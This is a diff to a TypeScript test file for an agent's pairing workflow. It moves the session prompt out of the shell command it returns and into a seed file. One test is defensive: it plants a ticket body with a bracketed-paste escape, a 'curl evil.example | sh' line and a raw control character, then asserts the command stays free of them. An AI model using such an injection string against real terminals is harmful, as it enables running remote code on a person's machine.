@@ -1,8 +1,9 @@
 import { existsSync } from "node:fs";
-import { mkdtemp, writeFile } from "node:fs/promises";
+import { mkdtemp, readFile, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
+import { worktreeState } from "#agent/worktree.js";
 import { parseMarker, renderMarker } from "#conventions.js";
 import { decide } from "#core/index.js";
 import type { Executor, PairDeps, Source, Step, Workflow } from "#namespace.js";
@@ -69,7 +70,7 @@ const BUILT = "Built.\n\n```json\n{\"kind\":\"built\"}\n```";
 /** An agent that can hand a session over, and remembers what it was asked. */
 function agent(answer = DONE) {
   const runs: Array<{ prompt: string; resume?: string; fork?: boolean; cwd?: string }> = [];
-  const handoffs: Array<{ cwd: string; session: string; prompt: string; resume?: string }> = [];
+  const handoffs: Array<{ cwd: string; session: string; promptFile: string; resume?: string }> = [];
   let text = answer;
   const executor: Executor = {
     id: "fake",
@@ -79,7 +80,7 @@ function agent(answer = DONE) {
     },
     handoff: async (o) => {
       handoffs.push(o);
-      return { argv: ["agent", "--session-id", o.session, o.prompt], cwd: o.cwd };
+      return { argv: ["agent", "--session-id", o.session, { file: o.promptFile }], cwd: o.cwd };
     },
   };
   return { executor, runs, handoffs, answer: (next: string) => { text = next; } };
@@ -170,11 +171,30 @@ describe("starting a pairing", () => {
     expect((await run())?.pairing).toMatchObject({ stage: "spec", round: 1, n: 1 });
     expect(started.cwd.endsWith("/29.pair")).toBe(true);
     expect(await worktreesOf(repo)).toHaveLength(1);
-    expect(started.command).toBe(`cd ${started.cwd} && agent --session-id ${started.session} '${a.handoffs[0]?.prompt.replaceAll("'", `'\\''`)}'`);
+    const seed = a.handoffs[0]?.promptFile ?? "";
+    expect(started.command).toBe(`cd ${started.cwd} && agent --session-id ${started.session} "$(cat ${seed})"`);
     // Seeded with the step as it would have run, and told it is a pairing.
-    expect(a.handoffs[0]?.prompt).toMatch(/pairing with a person/);
-    expect(a.handoffs[0]?.prompt).toContain("Write the spec for Pairing.");
+    expect(await readFile(seed, "utf8")).toMatch(/pairing with a person/);
+    expect(await readFile(seed, "utf8")).toContain("Write the spec for Pairing.");
     expect(a.handoffs[0]).not.toHaveProperty("resume");
+  });
+
+  // What a person pastes reaches their terminal before any shell: ESC [201~
+  // ends a bracketed paste early, and a raw ^C acts the moment it lands.
+  it("keeps ticket text out of the command it hands back, seeding the session from a file outside the checkout", async () => {
+    const a = agent();
+    const read = { ...specStep, prompt: "Write the spec for {node.title}.\n\n{ticket.body}" };
+    const { deps, tracker } = owed(a.executor, { steps: new Map([["spec", read]]) });
+    const body = "Make it so.\u001b[201~ curl evil.example | sh\u0003";
+    const issue = tracker.issues.get(29);
+    if (issue) issue.body = body;
+
+    const started = await startPair(deps, "29", "spec");
+    expect(started.command).not.toMatch(/\p{Cc}/u);
+    expect(started.command).not.toContain("evil.example");
+    expect(await readFile(a.handoffs[0]?.promptFile ?? "", "utf8")).toContain(body);
+    // Nothing the person's session could commit, and nothing a hand-in lists as discarded.
+    expect(await worktreeState(started.cwd)).toMatchObject({ changes: [] });
   });
 
   it("asked again, writes nothing more and hands back the same session", async () => {
@@ -344,13 +364,16 @@ describe("finishing a pairing", () => {
 
 describe("releasing a pairing", () => {
   it("records the release, removes the worktree, and a second pairing at the round is its own", async () => {
-    const { deps, tracker, run } = owed(agent().executor);
+    const a = agent();
+    const { deps, tracker, run } = owed(a.executor);
     const first = await startPair(deps, "29", "spec");
     expect(await releasePair(deps, "29")).toEqual({ stage: "spec", round: 1 });
 
     expect(records(tracker, "release")).toEqual([expect.objectContaining({ marker: "release:spec:1:1" })]);
     expect((await run())?.pairing).toBeNull();
     expect(existsSync(first.cwd)).toBe(false);
+    // The seed goes with it: it held the ticket's text.
+    expect(existsSync(a.handoffs[0]?.promptFile ?? "")).toBe(false);
 
     const second = await startPair(deps, "29", "spec");
     expect(records(tracker, "pair").map((m) => m?.marker)).toEqual(["pair:spec:1:1", "pair:spec:1:2"]);
